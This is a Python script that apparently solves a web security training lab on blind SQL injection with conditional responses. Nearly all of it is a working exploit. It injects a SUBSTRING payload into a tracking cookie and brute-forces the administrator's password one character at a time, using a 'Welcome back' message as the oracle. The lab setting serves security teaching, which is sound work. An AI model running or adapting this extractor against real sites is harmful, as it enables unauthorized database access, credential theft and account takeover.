"""
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


Lab: Blind SQL injection with conditional responses
"""

import requests
import string
import time

# Target URL
url = "http://example.new" #paste your url here

# Session cookie from the request
session_cookie = "place_holder" #put your cookie here

# Characters to try (lowercase letters, numbers, and some special chars)
chars = string.ascii_lowercase + string.digits + string.punctuation

# Function to check if the response indicates a successful guess
def check_response(response):
    return "Welcome back" in response.text

# Function to perform the blind SQL injection
def extract_password():
    password = ""
    i = 1
    
    while True:
        found = False
        
        for char in chars:
            # Construct the payload
            # This payload checks if the character at position i matches our guess
            payload = f"place_holder' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{char}'--" # place your tracking cooking to place holder
            
            # Set cookies with our payload
            cookies = {
                "TrackingId": payload,
                "session": session_cookie
            }
            
            try:
                # Send the request
                response = requests.get(url, cookies=cookies)
                
                # Check if our guess is correct
                if check_response(response):
                    password += char
                    found = True
                    print(f"Found character at position {i}: {char}")
                    print(f"Current password: {password}")
                    break
                
                # Add a small delay to avoid overloading the server
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Error occurred: {e}")
                time.sleep(1)  # Longer delay if an error occurs
        
        # If no character was found, we might have reached the end of the password
        if not found:
            print(f"No character found at position {i}, password extraction complete.")
            break
            
        i += 1
    
    return password

# Run the extraction
print("Starting password extraction...")
final_password = extract_password()
print(f"Extracted password: {final_password}")
